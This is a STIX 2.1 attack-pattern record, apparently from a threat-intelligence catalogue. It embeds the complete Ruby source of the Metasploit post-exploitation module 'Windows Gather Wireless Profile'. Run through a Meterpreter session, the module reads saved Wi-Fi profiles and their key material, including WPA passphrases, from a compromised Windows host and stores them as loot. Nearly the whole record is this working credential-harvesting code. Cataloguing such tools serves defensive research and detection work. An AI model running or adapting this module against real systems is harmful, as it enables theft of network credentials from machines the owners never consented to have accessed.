{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--60bdac5b-059d-4606-b7b9-fe1eb9d14d2c",
    "created": "2024-08-14T16:33:05.006069Z",
    "modified": "2024-08-14T16:33:05.006073Z",
    "name": "Windows Gather Wireless Profile",
    "description": " This module extracts saved Wireless LAN profiles. It will also try to decrypt the network key material. Behavior is slightly different between OS versions when it comes to WPA. In Windows Vista/7 we will get the passphrase. In Windows XP we will get the PBKDF2 derived key.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/wlan/wlan_profile.rb",
            "external_id": "wlan_profile.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Wireless Profile',\n        'Description' => %q{\n          This module extracts saved Wireless LAN profiles. It will also try to decrypt\n          the network key material. Behavior is slightly different between OS versions\n          when it comes to WPA. In Windows Vista/7 we will get the passphrase. In\n          Windows XP we will get the PBKDF2 derived key.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => ['theLightCosine'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_sys_process_attach\n              stdapi_sys_process_getpid\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  def run\n    # Opens memory access into the host process\n    mypid = client.sys.process.getpid\n    @host_process = client.sys.process.open(mypid, PROCESS_ALL_ACCESS)\n    @wlanapi = client.railgun.wlanapi\n    wlan_info = \"Wireless LAN Profile Information \\n\"\n    wlan_handle = open_handle\n    unless wlan_handle\n      print_error(\"Couldn't open WlanAPI Handle. WLAN API may not be installed on target\")\n      print_error('On Windows XP this could also mean the Wireless Zero Configuration Service is turned off')\n      return\n    end\n    wlan_iflist = enum_interfaces(wlan_handle)\n\n    if wlan_iflist.empty?\n      print_status('No wireless interfaces')\n      return\n    end\n\n    # Take each enumerated interface and gets the profile information available on each one\n    wlan_iflist.each do |interface|\n      wlan_profiles = enum_profiles(wlan_handle, interface['guid'])\n      guid = guid_to_string(interface['guid'])\n\n      # Store all the information to be saved as loot\n      wlan_info << \"GUID: #{guid} Description: #{interface['description']} State: #{interface['state']}\\n\"\n      wlan_profiles.each do |profile|\n        wlan_info << \" Profile Name: #{profile['name']}\\n\"\n        wlan_info << profile['xml']\n      end\n    end\n    # strip the nullbytes out of the text for safe outputting to loot\n    wlan_info.gsub!(/\\x00/, '')\n    print_good(wlan_info)\n    store_loot('host.windows.wlan.profiles', 'text/plain', session, wlan_info, 'wlan_profiles.txt', 'Wireless LAN Profiles')\n\n    # close the Wlan API Handle\n    closehandle = @wlanapi.WlanCloseHandle(wlan_handle, nil)\n    if closehandle['return'] == 0\n      print_status('WlanAPI Handle Closed Successfully')\n    else\n      print_error('There was an error closing the Handle')\n    end\n  end\n\n  def open_handle\n    begin\n      wlhandle = @wlanapi.WlanOpenHandle(2, nil, 4, 4)\n    rescue StandardError\n      return nil\n    end\n    return wlhandle['phClientHandle']\n  end\n\n  def enum_interfaces(wlan_handle)\n    iflist = @wlanapi.WlanEnumInterfaces(wlan_handle, nil, 4)\n    pointer = iflist['ppInterfaceList']\n    numifs = @host_process.memory.read(pointer, 4)\n    numifs = numifs.unpack('V')[0]\n    interfaces = []\n    return [] if numifs.nil?\n\n    # Set the pointer ahead to the first element in the array\n    pointer = (pointer + 8)\n    (1..numifs).each do |_i|\n      interface = {}\n      # Read the GUID (16 bytes)\n      interface['guid'] = @host_process.memory.read(pointer, 16)\n      pointer = (pointer + 16)\n      # Read the description(up to 512 bytes)\n      interface['description'] = @host_process.memory.read(pointer, 512)\n      pointer = (pointer + 512)\n      # Read the state of the interface (4 bytes)\n      state = @host_process.memory.read(pointer, 4)\n      pointer = (pointer + 4)\n\n      # Turn the state into human readable form\n      state = state.unpack('V')[0]\n      case state\n      when 0\n        interface['state'] = 'The interface is not ready to operate.'\n      when 1\n        interface['state'] = 'The interface is connected to a network.'\n      when 2\n        interface['state'] = 'The interface is the first node in an ad hoc network. No peer has connected.'\n      when 3\n        interface['state'] = 'The interface is disconnecting from the current network.'\n      when 4\n        interface['state'] = 'The interface is not connected to any network.'\n      when 5\n        interface['state'] = 'The interface is attempting to associate with a network.'\n      when 6\n        interface['state'] = 'Auto configuration is discovering the settings for the network.'\n      when 7\n        interface['state'] = 'The interface is in the process of authenticating.'\n      else\n        interface['state'] = 'Unknown State'\n      end\n      interfaces << interface\n    end\n    return interfaces\n  end\n\n  def enum_profiles(wlan_handle, guid)\n    profiles = []\n    proflist = @wlanapi.WlanGetProfileList(wlan_handle, guid, nil, 4)\n    ppointer = proflist['ppProfileList']\n    numprofs = @host_process.memory.read(ppointer, 4)\n    numprofs = numprofs.unpack('V')[0]\n    ppointer = (ppointer + 8)\n    (1..numprofs).each do |_j|\n      profile = {}\n      # Read the profile name (up to 512 bytes)\n      profile['name'] = @host_process.memory.read(ppointer, 512)\n      ppointer = (ppointer + 516)\n\n      rprofile = @wlanapi.WlanGetProfile(wlan_handle, guid, profile['name'], nil, 4, 4, 4)\n      xpointer = rprofile['pstrProfileXML']\n\n      # The size  of the XML string is unknown. If we read too far ahead we will cause it to break\n      # So we start at 1000bytes and see if the end of the xml is present, if not we read ahead another 100 bytes\n      readsz = 1000\n      profmem = @host_process.memory.read(xpointer, readsz)\n      until profmem[/(\\x00){2}/]\n        readsz = (readsz + 100)\n        profmem = @host_process.memory.read(xpointer, readsz)\n      end\n\n      # Slice off any bytes we picked up after the string terminates\n      profmem.slice!(profmem.index(/(\\x00){2}/), (profmem.length - profmem.index(/(\\x00){2}/)))\n      profile['xml'] = profmem\n      profiles << profile\n    end\n    return profiles\n  end\n\n  # Convert the GUID to human readable form\n  def guid_to_string(guid)\n    aguid = guid.unpack('H*')[0]\n    sguid = '{' + aguid[6, 2] + aguid[4, 2] + aguid[2, 2] + aguid[0, 2]\n    sguid << '-' + aguid[10, 2] + aguid[8, 2] + '-' + aguid[14, 2] + aguid[12, 2] + '-' + aguid[16, 4]\n    sguid << '-' + aguid[20, 12] + '}'\n    return sguid\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}